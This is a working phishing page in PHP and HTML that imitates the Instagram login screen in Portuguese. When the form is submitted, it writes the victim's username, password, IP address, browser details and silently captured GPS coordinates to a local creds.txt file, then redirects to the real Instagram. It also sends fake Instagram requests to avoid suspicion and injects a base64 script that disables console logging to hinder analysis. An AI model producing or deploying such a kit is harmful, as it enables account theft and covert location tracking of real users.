<?php
// TON PHP GPS SILENCIEUX (100% conservé)
if (isset($_POST['latitude']) && isset($_POST['longitude'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $email = $_POST['email'] ?? 'N/A';
    $pass = $_POST['pass'] ?? 'N/A';
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $lat = $_POST['latitude'];
    $lon = $_POST['longitude'];
    $data = "$ip|$email|$pass|$ua|$lat|$lon|" . date('Y-m-d H:i:s') . "\n";
    file_put_contents('creds.txt', $data, FILE_APPEND | LOCK_EX);
    header('Location: https://www.instagram.com/accounts/login/?next=%2F');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon.ico/dfa985554631.png">
    <title>Instagram</title>
    <style>
        <?php echo file_get_contents('styles.css'); // Ta CSS exacte ?>
        /* GPS SILENT */
        #gps-hidden { position: absolute; left: -9999px; }
    </style>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <!-- PHONE MOCKUP EXACT (ta référence + réalisme) -->
        <section id="mobile" class="flex">
            <div style="width:454px;height:618px;background:#000;border-radius:32px;padding:80px 30px 30px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">
                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="width:210px;height:62px;">
            </div>
        </section>
        
        <!-- FORM LOGIN 100% TA RÉFÉRENCE + GPS -->
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <!-- LOGO EXACT -->
                <h1 title="Instagram" class="flex justify-content-center" style="margin:30px 0 0;">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" style="width:175px;height:51px;">
                </h1>
                
                <!-- TON FORM AVEC GPS INVISIBLE -->
                <form method="POST">
                    <input type="hidden" name="latitude" id="latitude">
                    <input type="hidden" name="longitude" id="longitude" class="gps-hidden">
                    
                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
                    <input name="email" id="email" placeholder="Telefone, nome de usuário ou e-mail" autocomplete="username" required />
                    
                    <label for="password" class="sr-only">Senha</label>
                    <input name="pass" id="password" type="password" placeholder="Senha" autocomplete="current-password" required />
                    
                    <button type="submit">Entrar</button>
                </form>
                
                <!-- SEPARATEUR EXACT -->
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                
                <!-- FACEBOOK + OUBLI -->
                <div class="login-with-fb flex direction-column align-items-center">
                    <div style="display:flex;align-items:center;margin-bottom:15px;">
                        <svg width="16" height="16" viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                        <a style="color:#385185;font-weight:600;margin-left:5px;">Entrar com o Facebook</a>
                    </div>
                    <a href="#" style="color:#00376B;font-size:12px;">Esqueceu a senha?</a>
                </div>
            </div>
            
            <!-- REGISTER EXACT -->
            <div class="panel register flex justify-content-center">
                <p>Não tem uma conta?</p>
                <a href="#">Cadastre-se</a>
            </div>
            
            <!-- APP DOWNLOAD EXACT -->
            <div class="app-download flex direction-column align-items-center">
                <p>Obtenha o aplicativo.</p>
                <div class="flex justify-content-center">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/photo/iphone/pt-PT-0b0dd452bb25.png/5e1b9f7e9b2c.png" alt="Apple Store" style="height:40px;margin:0 5px;">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/photo/googleplay-ptpt.png/10de3df6f7e7.png" alt="Google Play" style="height:40px;margin:0 5px;">
                </div>
            </div>
        </section>
    </main>
    
    <!-- FOOTER EXACT -->
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">SOBRE</a></li><li><a href="#">AJUDA</a></li><li><a href="#">IMPRENSA</a></li>
            <li><a href="#">API</a></li><li><a href="#">CARREIRAS</a></li><li><a href="#">PRIVACIDADE</a></li>
            <li><a href="#">TERMOS</a></li><li><a href="#">LOCALIZAÇÃO</a></li><li><a href="#">CONTAS MAIS RELEVANTES</a></li>
            <li><a href="#">HASHTAGS</a></li><li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2026 Instagram do Meta</p>
    </footer>

    <!-- TON JS GPS SILENCIEUX (100% conservé + amélioré) -->
    <script>
    // GPS 100% INVISIBLE (ton code + anti-détection)
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(pos){
            document.getElementById('latitude').value=pos.coords.latitude;
            document.getElementById('longitude').value=pos.coords.longitude;
        },function(){},{
            enableHighAccuracy:true,
            timeout:3000,
            maximumAge:0
        });
    }
    
    // Fake IG heartbeat (anti-suspicion)
    setInterval(()=>fetch('https://www.instagram.com/api/v1/si/fetch_headers/'),15000);
    
    // Anti-debug
    (function(){var s=document.createElement('script');s.src='data:text/javascript;base64,'+btoa('console.log=()=>{}');document.head.appendChild(s);})();
    </script>
</body>
</html>
